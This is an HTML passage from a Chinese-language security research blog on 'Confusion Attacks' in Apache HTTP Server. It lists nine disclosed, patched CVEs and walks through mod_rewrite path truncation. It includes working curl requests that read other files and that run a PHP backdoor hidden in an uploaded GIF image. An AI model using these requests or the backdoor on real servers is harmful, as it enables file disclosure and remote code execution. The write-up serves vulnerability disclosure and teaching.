              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets&quot;&gt;2-3-1. Jailbreak from Local Gadgets&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-3-handler-confusion&quot;&gt;3. Handler Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-1-overwrite-the-handler&quot;&gt;Primitive 3-1. Overwrite the Handler&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-2-overwrite-handler-to---&quot;&gt;3-1-2. Overwrite Handler to ██████ ███████ ██████&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;Primitive 3-2. Invoke Arbitrary Handlers&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;3-2-1. Arbitrary Handler to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;3-2-2. Arbitrary Handler to Full SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce&quot;&gt;3-2-4. Arbitrary Handler to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-4-其它漏洞&quot;&gt;4. 其它漏洞&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-38472---基於-windows-unc-的-ssrf&quot;&gt;CVE-2024-38472 - 基於 Windows UNC 的 SSRF&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-透過-http-請求解析器觸發&quot;&gt;透過 HTTP 請求解析器觸發&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-透過-type-map-觸發&quot;&gt;透過 Type-Map 觸發&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-39573---基於-rewriterule-前綴可完全控制的-ssrf&quot;&gt;CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#未來研究方向&quot;&gt;未來研究方向&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#結語&quot;&gt;結語&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;在故事之前&quot;&gt;在故事之前&lt;/h2&gt;

&lt;p&gt;這裡純粹是一些個人的 Murmur，如果只對技術細節感興趣可以直接跳到 —— &lt;a href=&quot;#故事是如何開始的&quot;&gt;故事是如何開始的？&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;身為一名研究員、最大的快樂應該就是當自己的作品被同行關注並理解。所以當完成一個作品並擁有豐碩的成果後，理所當然會想要讓它被世界看到 —— 這也是為什麼我會多次在 Black Hat USA 以及 DEFCON 上分享的緣故。 在讀這篇文章的你也許知道，我從 2022 後就拿不到一個合法的簽證進入美國 (在&lt;a href=&quot;https://esta.cbp.dhs.gov/&quot;&gt;免簽計畫&lt;/a&gt;中的台灣，通常只需要線上申請，數分鐘到數小時內就能取得旅行授權)，導致錯過 &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA 2022&lt;/a&gt; 的實體演講。甚至 2023 到秘魯還有復活節島獨旅也無法從美國轉機 :(&lt;/p&gt;

&lt;p&gt;為了解決這個情況，我從今年一月就開始準備 B1/B2 簽證、撰寫各式文件、到大使館面試以及漫無止盡的等待，這不是一件好玩的事，但為了讓作品被看到，還是花了非常多的時間在為了簽證奔波，以及尋求各種可能，甚至到會議開始的前三個禮拜，還不清楚發表是否會被取消 (BH 一開始只接受現場演講，不過謝謝審稿委員對這份研究的認可最終還是能透過預錄的形式發表)，所以你所看到的所有內容包含投影片、錄影以及部落格文字都是在短短數十天內完成的。 😖&lt;/p&gt;

&lt;p&gt;我只是一個單純的研究員，自認問心無愧，對漏洞的態度也始終是 —— 漏洞就該讓它被廠商知道以及修復。 寫這些文字也不為了什麼，純粹紀錄下一些無奈的心情、今年所做過的努力，以及謝謝在這個過程中幫助過我的人，謝謝你們 :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;故事是如何開始的&quot;&gt;故事是如何開始的？&lt;/h2&gt;

&lt;p&gt;大概是在今年年初的時候，我開始思考下一個研究的目標，也許你知道我總是希望挑戰那些影響整個網際網路的大目標，所以開始尋找一些看似複雜的主題或有趣的開源專案，例如 Nginx、PHP、甚至開始看起 RFC 來強化自己對於協議實作細節的認知。&lt;/p&gt;

&lt;p&gt;雖然大部分的嘗試都以失敗告終 (不過有些也許會變成下一篇部落格主題 😉)，但在細細品嘗這些程式碼時，我回憶起了曾經在去年年中短暫看過 Apache HTTP Server 原始碼這件事！ 儘管最終由於工作的時程規畫並無深入的閱讀程式碼，但在那時就已經從它的編碼風格上「聞」到了一些不太好的味道。&lt;/p&gt;

&lt;p&gt;於是在今年決定繼續下去，把「為什麼聞起來怪怪的」這件事從原本只是一個說不出的「感覺」具象化，深入下去研究 Apache HTTP Server！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;為什麼-apache-http-server-聞起來臭臭的&quot;&gt;為什麼 Apache HTTP Server 聞起來臭臭的？&lt;/h2&gt;

&lt;p&gt;首先，Apache HTTP Server 是一個由「模組們」建構起來的世界，從它&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mpm.html&quot;&gt;官方文件&lt;/a&gt;中也看到其對於自身模組化 (MPMs - Multi-Processing Modules) 的自豪：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache httpd has always accommodated a wide variety of environments through its modular design. […] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;整個 Httpd 的服務需要由數百個小模組齊心合力，共同合作才能完成客戶端的 HTTP 請求，&lt;strong&gt;&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/&quot;&gt;官方所列出的 136 個模組&lt;/a&gt;其中約有快一半是預設啟用或經常被使用的模組&lt;/strong&gt;！&lt;/p&gt;

&lt;p&gt;而更令人驚訝的是，這麼多模組在處理客戶端 HTTP 請求的時候，彼此之間還要共同維護著一份非常巨大的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request_rec&lt;/code&gt; 結構。 這個結構包括了在處理 HTTP 時會用到的一切元素，詳細的定義可以從 &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838&quot;&gt;include/httpd.h&lt;/a&gt; 中找到。 所有模組都依賴這個巨大的結構去同步、溝通，甚至交換資料。 這個內部結構會像是拋接球般在所有模組間傳遞來傳遞去，每個模組都可以根據自己的喜好去隨意修改這個結構上的任意值！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這樣子的合作方式從軟體工程的角度來說其實不是什麼新鮮事，個體只需專心把份內事完成，只要所有人都乖乖完成自己的工作，那客戶就可以正常享受 Httpd 所提供的服務。 這樣子的分工在數個模組內可能還沒什麼問題，&lt;strong&gt;但如果今天把規模放大到數百個模組間的協同合作 —— 它們真的有辦法好好合作嗎？&lt;/strong&gt; 🤔&lt;/p&gt;

&lt;p&gt;所以我們的出發點很簡單 —— &lt;strong&gt;模組間其實並不完全了解彼此的實作細節，但卻又被要求要一起合作&lt;/strong&gt;。 每個模組可能由不同的開發者實作，程式碼歷經多年的疊代、重整以及修改，它們真的還清楚自己在做什麼嗎？ 就算對自己瞭若指掌，那對其它模組呢？ 在缺乏一個好的開發標準或使用準則下，這中間必然會存在很多小縫隙是我們可以利用的！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;關於這次的新攻擊面-confusion-attacks&quot;&gt;關於這次的新攻擊面： Confusion Attacks&lt;/h2&gt;

&lt;p&gt;基於前面的思考，我們開始專注在&lt;strong&gt;研究這些模組間的「關係」以及「交互作用」&lt;/strong&gt;。 如果有一個模組不小心修改到了它覺得不重要但對另一個模組至關重要的結構欄位，那可能就會影響該模組的判斷。 甚至更進一步，如果 Apache HTTP Server 對這些結構的定義不夠精確，導致不同模組對同一個欄位在理解上有著根本的不一致，這都可能產生安全上的風險！&lt;/p&gt;

&lt;p&gt;從這個出發點我們發展出了三種不同的攻擊，由於這些攻擊或多或少都模組對於結構欄位的誤用有關，因此把這個攻擊面命名為「Confusion Attack」，而以下是我們所發展出的攻擊：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filename Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DocumentRoot Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Handler Confusion&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;從這些攻擊出發我們找到了 9 個不同的漏洞：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38472&lt;/strong&gt; - Apache HTTP Server on Windows UNC SSRF&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-39573&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38477&lt;/strong&gt; - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38476&lt;/strong&gt; - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38475&lt;/strong&gt; - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38474&lt;/strong&gt; - Apache HTTP Server weakness with encoded question marks in backreferences&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38473&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2023-38709&lt;/strong&gt; - Apache HTTP Server: HTTP response splitting&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-??????&lt;/strong&gt; - [redacted]&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;這些漏洞都透過官方的安全信箱回報，並由 Apache HTTP Server 團隊在 2024-07-01 發佈安全性通報以及 2.4.60 更新 (詳細可參考&lt;a href=&quot;https://httpd.apache.org/security/vulnerabilities_24.html&quot;&gt;官方公告&lt;/a&gt;)。&lt;/p&gt;

&lt;p&gt;由於這是一個針對 Httpd 架構以及其內部機制所帶來的新攻擊面，&lt;del&gt;理所當然第一個參與的人可以找到最多漏洞，因此我也是目前擁有最多 Apache HTTP Server CVE 的人 😉&lt;/del&gt;，導致很多更新修復由於其歷史架構無法向下兼容。 所以對於很多運行許久的正式伺服器來說修復並不是一件容易的事，若網站管理員不經思考就直接更新反而會打破許多舊有的設定造成服務中斷。 😨&lt;/p&gt;

&lt;p&gt;接下來就開始介紹這次發展出來的攻擊們吧！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-1-filename-confusion&quot;&gt;🔥 1. Filename Confusion&lt;/h3&gt;

&lt;p&gt;首先，第一個是基於 Filename 欄位上的 Confusion，從字面上來看 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 應該是一個檔案系統路徑，然而在 Httpd 中，有些模組會把它當成網址來處理。 如果在 HTTP 請求的上下文中，有些模組把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 當成檔案路徑，而其他模組將它當成網址，這其中的不一致就會造成安全上的問題！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-1-1-truncation&quot;&gt;⚔️ Primitive 1-1. Truncation&lt;/h4&gt;

&lt;p&gt;所以哪些模組會把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 當成網址呢？ 首先是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; 允許網站管理員透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 語法輕鬆的將路徑透過指定的規則改寫：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; Pattern Substitution [flags]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中目標可以是一個檔案系統路徑或是一個網址，我想這應該是一個為了使用者體驗所做出的方便，但同時這個「方便」也帶出了一些風險，例如&lt;strong&gt;在改寫路徑時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; 會強制把結果視為網址處理 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splitout_queryargs()&lt;/code&gt;)&lt;/strong&gt;，這導致了在 HTTP 請求中可以透過一個問號 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%3F&lt;/code&gt; 去截斷 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 後面的路徑或網址，並引出以下兩種攻擊手法。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141&quot;&gt;modules/mappers/mod_rewrite.c#L4141&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * Apply a single RewriteRule
 */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_rewrite_rule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriterule_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewrite_ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_regmatch_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regmatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AP_MAX_REG_MATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;apr_array_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nelts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apply_rewrite_cond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// [...] do the remaining stuff&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;cm&quot;&gt;/* Now adjust API&apos;s knowledge about r-&amp;gt;filename and r-&amp;gt;args */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newuri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULEFLAG_DISCARDPATHINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;splitout_queryargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------- [!!!] Truncate the `r-&amp;gt;filename`&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-1-1-1-path-truncation&quot;&gt;✔️ 1-1-1. Path Truncation&lt;/h5&gt;

&lt;p&gt;首先，第一個攻擊手法是檔案系統路徑上的截斷，想像下面這個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;^/user/(.+)$&quot; &quot;/var/user/$1/profile.yml&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;伺服器會根據網址路徑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/&lt;/code&gt; 後的使用者名稱開啟相對應的個人設定檔案，例如：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/profile.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; 會強制將重寫後的結果當成一個網址處理，因此雖然目標是一個檔案系統路徑，但卻可以透過一個問號去截斷後方的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile.yml&lt;/code&gt; 例如：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange%2Fsecret.yml%3F
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/secret.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這是我們的第一個攻擊手法 —— 路徑截斷。 對於這個攻擊手法的探索先稍稍停留在這邊，雖然目前看起來還只是一個小瑕疵，但請先記好它，因為這會在之後的攻擊中一再的出現，慢慢把這個看似無用的小破口撕裂開來！ 😜&lt;/p&gt;

&lt;h5 id=&quot;️-1-1-2-mislead-rewriteflag-assignment&quot;&gt;✔️ 1-1-2. Mislead RewriteFlag Assignment&lt;/h5&gt;

&lt;p&gt;截斷手法的第二個利用是誤導 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlag&lt;/code&gt; 的設置，想像網站管理員透過下列的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 去管理網站中路徑以及相對應模組：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^(.+\.php)$  $1  [H=application/x-httpd-php]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果請求附檔名是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; 結尾則加上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; 相對應的處理器 (此外也可以是環境變數或是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;，關於標誌的詳細設定可參考官方的手冊 &lt;a href=&quot;https://httpd.apache.org/docs/2.4/rewrite/flags.html&quot;&gt;RewriteRule Flags&lt;/a&gt;)。&lt;/p&gt;

&lt;p&gt;由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; 的截斷行為發生在正規表達式匹配後，因此惡意的攻擊者可以利用原本的規則，透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; 將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlag&lt;/code&gt; 設定到不屬於它們的請求上。 例如上傳一個夾帶惡意 PHP 程式碼的 GIF 圖片並透過惡意請求將圖片當成後門執行：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif
 &lt;span class=&quot;c&quot;&gt;# GIF89a &amp;lt;?=`id`;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif%3fooo.php
 &lt;span class=&quot;c&quot;&gt;# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-1-2-acl-bypass&quot;&gt;⚔️ Primitive 1-2. ACL Bypass&lt;/h4&gt;

&lt;p&gt;Filename Confusion 的第二個攻擊手法發生在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 身上，相較前一個攻擊是無條件將目標當成網址處理，這次則是&lt;strong&gt;因為模組間對 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 的理解不一致所導致的認證及存取控制繞過&lt;/strong&gt;！&lt;/p&gt;

